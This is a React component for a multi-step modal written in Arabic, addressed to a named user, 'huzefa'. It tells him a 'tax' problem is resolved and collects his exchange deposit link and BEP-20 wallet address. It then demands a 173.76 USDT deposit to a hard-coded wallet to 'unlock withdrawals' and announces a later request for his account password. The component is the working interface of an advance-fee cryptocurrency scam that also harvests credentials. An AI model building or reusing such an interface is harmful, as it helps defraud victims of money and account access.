
import React, { useState } from 'react';
import { X, Copy, CheckCircle2, Loader2 } from 'lucide-react';

interface MultiStepModalProps {
  onClose: () => void;
}

const MultiStepModal: React.FC<MultiStepModalProps> = ({ onClose }) => {
  const [step, setStep] = useState(1);
  const [copied, setCopied] = useState(false);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="text-right flex flex-col items-center">
            <p className="text-[#333] text-lg leading-relaxed mb-6 font-medium">
              اهلا بك <span className="font-bold text-[#9B4A4E]">huzefa</span> تم حل أمر الضريبه يمكن سحب جميع العملات يرجى عدم مشاركه الرابط الخاص بحسابك نحن غير مسؤولين عن فقدان العملات ان تم تسريبه الان اضغط التالي وقم بوضع رابط المنصه <span className="text-blue-600 font-bold">mini pro</span> لقسم الايداع حصرا
            </p>
            <button 
              onClick={() => setStep(2)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="text-right flex flex-col gap-4">
            <label className="text-sm font-bold text-gray-700">رابط المنصه mini pro لقسم الايداع:</label>
            <input 
              type="text" 
              placeholder="أدخل الرابط هنا..." 
              className="w-full border border-gray-300 rounded-xl p-3 text-right focus:outline-none focus:ring-2 focus:ring-[#9B4A4E]"
            />
            <button 
              onClick={() => setStep(3)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="text-right flex flex-col gap-4">
            <label className="text-sm font-bold text-gray-700">رابط محفظة BEP-20 الخاص بك:</label>
            <input 
              type="text" 
              placeholder="0x..." 
              className="w-full border border-gray-300 rounded-xl p-3 text-left focus:outline-none focus:ring-2 focus:ring-[#9B4A4E]"
            />
            <button 
              onClick={() => setStep(4)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 4:
        const address = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";
        return (
          <div className="text-right flex flex-col gap-4">
            <p className="text-[#333] text-[15px] leading-relaxed">
              اهلا بك <span className="font-bold">huzefa</span> بقي أمر إيداع مبلغ <span className="font-bold text-red-600">173.76</span> عملة <span className="font-bold">USDT BEP-20</span> لفتح قناة السحب هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه <span className="font-bold">mini pro</span> وتم تخفيض الضريبة بتسويه من منصة mini pro بموجب اتفاق ضمن برتكول الخاص بالمنصه الاساسيه
            </p>
            <div className="bg-gray-100 p-3 rounded-lg border border-gray-200 flex items-center justify-between gap-2 overflow-hidden">
              <button 
                onClick={() => handleCopy(address)}
                className="text-[#9B4A4E] shrink-0"
              >
                {copied ? <CheckCircle2 size={20} /> : <Copy size={20} />}
              </button>
              <span className="text-[11px] font-mono break-all text-left w-full select-all">
                {address}
              </span>
            </div>
            <button 
              onClick={() => setStep(5)}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
            >
              تم الايداع
            </button>
          </div>
        );
      case 5:
        return (
          <div className="text-right flex flex-col items-center gap-6 py-4">
            <Loader2 className="animate-spin text-[#9B4A4E]" size={40} />
            <p className="text-[#333] text-[15px] leading-relaxed text-center">
              الرجاء الانتظار للتأكد من عمليه الايداع سيتم توجهيك للخطوة النهائيه بعد تأكيد الايداع لوضع كلمة المرور وستكون اخر خطوة تفصل عن السحب الخطوة التاليه يجب وضع كلمة المرور الحساب
            </p>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div 
      className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/40 backdrop-blur-[2px]"
      dir="rtl"
    >
      <div className="bg-white w-full max-w-[380px] rounded-3xl p-6 relative shadow-2xl animate-in zoom-in-95 duration-200">
        {step < 5 && (
          <button 
            onClick={onClose}
            className="absolute top-4 left-4 text-gray-400 hover:text-gray-600"
          >
            <X size={24} />
          </button>
        )}
        
        <div className="mt-4">
          {renderStep()}
        </div>
      </div>
    </div>
  );
};

export default MultiStepModal;
